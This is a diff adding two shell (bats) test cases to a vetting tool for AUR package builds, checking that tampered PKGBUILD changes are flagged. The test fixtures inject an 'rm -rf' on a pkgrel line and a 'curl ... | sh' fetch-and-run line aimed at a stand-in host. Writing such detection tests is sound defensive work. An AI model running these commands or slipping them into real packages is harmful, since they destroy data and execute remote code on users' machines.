@@ -133,3 +133,20 @@ _head() { git -C "$1" rev-parse HEAD; }
   [ "$status" -eq 1 ]
   [[ "$output" == *"changed since Vetted Commit"* ]]
 }
+
+@test "pins: code riding on a pkgrel line is not bump-only (review fix)" {
+  local d; d="$(aurvet_clone electron-benign)"; aurvet_pin "$d"
+  aurvet_commit "$d" PKGBUILD 's/^pkgrel=1$/pkgrel=1; rm -rf "$HOME\/x"/'
+  aurvet_hook "$d"
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"changed since Vetted Commit"* ]]
+}
+
+@test "pins: a PKGBUILD turned binary by a NUL byte is never bump-only" {
+  local d; d="$(aurvet_clone electron-benign)"; aurvet_pin "$d"
+  printf '  curl -s https://x.example/i | sh # \0\n' >> "$d/PKGBUILD"
+  git -C "$d" -c user.name=m -c user.email=m@aur commit -q -am nul
+  aurvet_hook "$d"
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"CRITICAL nul-in-script PKGBUILD"* ]]
+}
